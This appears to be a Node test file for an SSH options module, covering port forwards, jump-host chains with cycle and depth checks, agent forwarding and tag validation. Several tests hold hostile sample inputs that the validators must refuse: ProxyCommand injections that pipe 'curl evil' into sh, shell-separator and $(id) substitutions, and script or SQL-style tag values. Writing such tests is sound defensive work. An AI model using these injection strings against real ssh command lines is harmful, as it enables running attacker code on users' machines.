import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  JumpChain,
  MAX_JUMP_DEPTH,
  isSafeTag,
  normalizeForwards,
  parseForward,
  renderForward,
  hopOf,
  resolveJumpChain,
  resolveJumpHops,
  sshOptionArgv,
} from '../sshOptions';
import { EntityMetadata } from '../types';

const host = (id: string, extra: Partial<EntityMetadata> = {}): EntityMetadata => ({
  id,
  name: id,
  isSshEnabled: true,
  host: `${id}.example.com`,
  user: 'me',
  ...extra,
});

// ---- port forwards -----------------------------------------------------------

test('a local forward renders the -L argument ssh expects', () => {
  assert.deepEqual(
    renderForward({ kind: 'local', bindPort: 5432, host: 'db.internal', hostPort: 5432 }),
    ['-L', '5432:db.internal:5432'],
  );
});

test('a remote forward renders -R, and a bind address is kept in front', () => {
  assert.deepEqual(
    renderForward({ kind: 'remote', bindPort: 8080, host: 'localhost', hostPort: 80 }),
    ['-R', '8080:localhost:80'],
  );
  assert.deepEqual(
    renderForward({ kind: 'local', bindAddress: '127.0.0.1', bindPort: 9000, host: 'app', hostPort: 90 }),
    ['-L', '127.0.0.1:9000:app:90'],
  );
});

test('the compact form people already know round-trips', () => {
  const parsed = parseForward('local', '5432:db.internal:5432');
  assert.deepEqual(parsed, { kind: 'local', bindPort: 5432, host: 'db.internal', hostPort: 5432 });
  assert.deepEqual(renderForward(parsed!), ['-L', '5432:db.internal:5432']);

  const bound = parseForward('local', '127.0.0.1:9000:app.internal:90');
  assert.equal(bound?.bindAddress, '127.0.0.1');
  assert.equal(bound?.bindPort, 9000);
});

test('a port outside 1-65535 is refused, at both ends', () => {
  assert.equal(parseForward('local', '0:h:80'), undefined);
  assert.equal(parseForward('local', '70000:h:80'), undefined);
  assert.equal(parseForward('local', '80:h:0'), undefined);
  assert.equal(parseForward('local', '80:h:99999'), undefined);
});

test('a forward host that ssh would read as a FLAG is refused', () => {
  // The same rule the destination has: a leading dash is an option, and
  // `-oProxyCommand=` runs a local command. A forward is another way into that parser.
  assert.equal(parseForward('local', '80:-oProxyCommand=curl evil|sh:80'), undefined);
  assert.equal(parseForward('local', '80:h;curl evil:80'), undefined);
  assert.equal(parseForward('local', '80:h $(id):80'), undefined);
});

test('nonsense shapes are refused rather than half-read', () => {
  assert.equal(parseForward('local', ''), undefined);
  assert.equal(parseForward('local', '5432'), undefined);
  assert.equal(parseForward('local', '5432:db'), undefined);
  assert.equal(parseForward('local', 'a:b:c:d:e'), undefined);
});

test('normalizeForwards drops disabled rows and anything that stopped being valid', () => {
  // A row kept but switched off is the same idea as a disabled command argument: it is
  // there to be turned back on, and it must not reach the command line meanwhile.
  const rows = normalizeForwards([
    { kind: 'local', bindPort: 1, host: 'a', hostPort: 2 },
    { kind: 'local', bindPort: 3, host: 'b', hostPort: 4, disabled: true },
    { kind: 'remote', bindPort: 5, host: '-evil', hostPort: 6 },
  ]);

  assert.deepEqual(rows, [{ kind: 'local', bindPort: 1, host: 'a', hostPort: 2 }]);
});

// ---- jump hosts --------------------------------------------------------------

test('one hop resolves to the -J value ssh takes', () => {
  const bastion = host('bastion');
  const target = host('target', { jumpHostEntityId: 'bastion' });

  const chain = resolveJumpChain(target, (id) => (id === 'bastion' ? bastion : undefined));

  assert.deepEqual(chain, { ok: true, value: 'me@bastion.example.com' });
});

test('two hops chain in the order ssh walks them', () => {
  const outer = host('outer');
  const inner = host('inner', { jumpHostEntityId: 'outer' });
  const target = host('target', { jumpHostEntityId: 'inner' });
  const byId = (id: string) => ({ outer, inner }[id]);

  const chain = resolveJumpChain(target, byId);

  // ssh reads -J left to right: the first is the one contacted first.
  assert.deepEqual(chain, { ok: true, value: 'me@outer.example.com,me@inner.example.com' });
});

test('a non-default port travels with its hop', () => {
  const bastion = host('bastion', { port: 2222 });
  const target = host('target', { jumpHostEntityId: 'bastion' });

  assert.deepEqual(resolveJumpChain(target, () => bastion), {
    ok: true,
    value: 'me@bastion.example.com:2222',
  });
});

test('a CYCLE is refused by name rather than hanging', () => {
  // Nodes arrive by sync and by import, so parentage is data, not an invariant — the same
  // reason the tree filter's walk is cycle-bounded.
  const a: EntityMetadata = host('a', { jumpHostEntityId: 'b' });
  const b: EntityMetadata = host('b', { jumpHostEntityId: 'a' });
  const byId = (id: string) => ({ a, b }[id]);

  const chain = resolveJumpChain(a, byId);

  assert.equal(chain.ok, false);
  assert.match((chain as { reason: string }).reason, /circle|cycle/i);
});

test('a missing jump entity is refused, and says which one', () => {
  const target = host('target', { jumpHostEntityId: 'gone' });

  const chain = resolveJumpChain(target, () => undefined);

  assert.equal(chain.ok, false);
  assert.match((chain as { reason: string }).reason, /no longer exists/i);
});

test('a jump host whose own address is unsafe is refused', () => {
  const hostile = host('hostile', { host: '-oProxyCommand=curl evil|sh' });
  const target = host('target', { jumpHostEntityId: 'hostile' });

  const chain = resolveJumpChain(target, () => hostile);

  assert.equal(chain.ok, false);
  assert.match((chain as { reason: string }).reason, /cannot be used/i);
});

test('a chain deeper than the cap is refused rather than walked forever', () => {
  // Distinct entities, so this is depth and not a cycle.
  const byId = (id: string): EntityMetadata | undefined => {
    const n = Number(id.replace('h', ''));
    return Number.isNaN(n) ? undefined : host(id, { jumpHostEntityId: `h${n + 1}` });
  };
  const target = host('target', { jumpHostEntityId: 'h0' });

  const chain = resolveJumpChain(target, byId);

  assert.equal(chain.ok, false);
  assert.match((chain as { reason: string }).reason, new RegExp(String(MAX_JUMP_DEPTH)));
});

// ---- the shared option array -------------------------------------------------

test('an entity with nothing extra contributes no options at all', () => {
  assert.deepEqual(sshOptionArgv(host('plain'), undefined), []);
});

test('agent forwarding is -A, and only when asked for', () => {
  assert.deepEqual(sshOptionArgv(host('a', { agentForward: true }), undefined), ['-A']);
  assert.deepEqual(sshOptionArgv(host('a', { agentForward: false }), undefined), []);
});

test('forwards and the jump value come out in one array, jump first', () => {
  const entity = host('a', {
    agentForward: true,
    portForwards: [{ kind: 'local', bindPort: 5432, host: 'db', hostPort: 5432 }],
  });

  assert.deepEqual(sshOptionArgv(entity, 'me@bastion'), [
    '-J',
    'me@bastion',
    '-A',
    '-L',
    '5432:db:5432',
  ]);
});

// ---- tags --------------------------------------------------------------------

test('a tag is a label, not a place to put anything else', () => {
  assert.equal(isSafeTag('production'), true);
  assert.equal(isSafeTag('eu-west 1'), true);
  assert.equal(isSafeTag(''), false);
  assert.equal(isSafeTag('x'.repeat(25)), false);
  assert.equal(isSafeTag('drop; table'), false);
  assert.equal(isSafeTag('<script>'), false);
});

// ---- rule B: which entry a refusal is about --------------------------------------------------------------

/** The entry a refusal is about, or `undefined` for a chain that was not refused (and for a refusal that names the starting entry). */
const secondOf = (chain: JumpChain): unknown => (chain.ok ? undefined : chain.second);

test('B5: an unsafe hop at depth 1 and at depth 3 says which entry it is, as a jump host', () => {
  const unsafe = (id: string, next?: string): EntityMetadata => host(id, { host: 'bad host!', ...(next === undefined ? {} : { jumpHostEntityId: next }) });
  const depth1 = resolveJumpChain(host('target', { jumpHostEntityId: 'h1' }), (id) => (id === 'h1' ? unsafe('h1') : undefined));
  assert.deepEqual(secondOf(depth1), { id: 'h1', relation: 'jump host' });
  const nodes: Record<string, EntityMetadata> = { h1: host('h1', { jumpHostEntityId: 'h2' }), h2: host('h2', { jumpHostEntityId: 'h3' }), h3: unsafe('h3') };
  const depth3 = resolveJumpChain(host('target', { jumpHostEntityId: 'h1' }), (id) => nodes[id]);
  assert.deepEqual(secondOf(depth3), { id: 'h3', relation: 'jump host' });
});

test('B5: a circle, a missing hop and the depth cap name the starting entry, so they say no second entry', () => {
  const a = host('a', { jumpHostEntityId: 'b' });
  const b = host('b', { jumpHostEntityId: 'a' });
  const circle = resolveJumpChain(a, (id) => ({ a, b })[id as 'a' | 'b']);
  const missing = resolveJumpChain(host('target', { jumpHostEntityId: 'gone' }), () => undefined);
  const deep = resolveJumpChain(host('target', { jumpHostEntityId: 'h0' }), (id) => host(id, { jumpHostEntityId: `h${Number(id.slice(1)) + 1}` }));
  for (const chain of [circle, missing, deep]) {
    assert.equal(chain.ok, false);
    assert.equal(secondOf(chain), undefined);
  }
});

// ---- E1.6 B1: the hop entries of the walk, in the order ssh contacts them ------------------------

test('J1: resolveJumpHops answers the hop entries in the order of the -J text, and the same value as resolveJumpChain', () => {
  const outer = host('outer');
  const inner = host('inner', { jumpHostEntityId: 'outer', port: 2222 });
  const target = host('target', { jumpHostEntityId: 'inner' });
  const byId = (id: string) => ({ outer, inner }[id]);

  const walked = resolveJumpHops(target, byId);

  assert.ok(walked.ok && walked.hops !== undefined);
  assert.deepEqual(walked.hops.map((hop) => hop.id), ['outer', 'inner']);
  assert.equal(walked.hops.map(hopOf).join(','), walked.value);
  const chain = resolveJumpChain(target, byId);
  assert.ok(chain.ok);
  assert.equal(walked.value, chain.value);
  assert.deepEqual(resolveJumpHops(host('plain'), byId), { ok: true, value: undefined, hops: [] });
  const gone = host('t', { jumpHostEntityId: 'gone' });
  assert.deepEqual(resolveJumpHops(gone, byId), resolveJumpChain(gone, byId), 'a refusal is the same refusal');
});

test('J2: resolveJumpChain answers the object it always did: the keys ok and value, and no other', () => {
  const bastion = host('bastion');
  const target = host('target', { jumpHostEntityId: 'bastion' });

  const chain = resolveJumpChain(target, () => bastion);

  assert.deepEqual(Object.keys(chain), ['ok', 'value']);
  assert.deepEqual(Object.keys(resolveJumpChain(host('plain'), () => undefined)), ['ok', 'value']);
});
